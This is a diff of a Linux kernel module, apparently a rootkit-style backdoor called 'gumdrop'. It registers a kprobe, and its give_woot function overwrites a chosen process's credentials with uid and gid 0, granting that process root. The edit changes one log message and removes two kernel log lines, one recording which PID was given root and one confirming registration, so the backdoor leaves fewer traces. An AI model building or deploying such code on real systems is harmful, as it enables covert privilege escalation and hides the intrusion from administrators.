@@ -30,7 +30,7 @@ void give_woot(pid_t target_pid) {
     printk(KERN_INFO "cannot give woot (literally 1984)\n");
     return;
   }
-  printk(KERN_INFO "prepared creds :D\n");
+  printk(KERN_INFO "gave woot!\n");
   newcreds->uid.val = newcreds->gid.val = 0;
   newcreds->euid.val = newcreds->egid.val = 0;
   newcreds->suid.val = newcreds->sgid.val = 0;
@@ -39,7 +39,6 @@ void give_woot(pid_t target_pid) {
   rcu_assign_pointer(task->real_cred, newcreds);
   rcu_assign_pointer(task->cred, newcreds);
   rcu_read_unlock();
-  printk(KERN_INFO "gave woot to PID: %d", current->pid);
 }
 static unsigned long get_syscall_return_addr(struct pt_regs *regs) {
   unsigned long *stack = (unsigned long *)regs->sp; // skip rest of system call
@@ -72,8 +71,6 @@ static int __init gumdrop_init(void) {
   int ret = register_kprobe(&kp);
   if (ret < 0) {
     printk(KERN_INFO "cannot register %d!\n", ret);
-  } else {
-    printk(KERN_INFO "registered!\n");
   }
   printk(KERN_INFO "Hewo pwincess!\n");
   return ret;
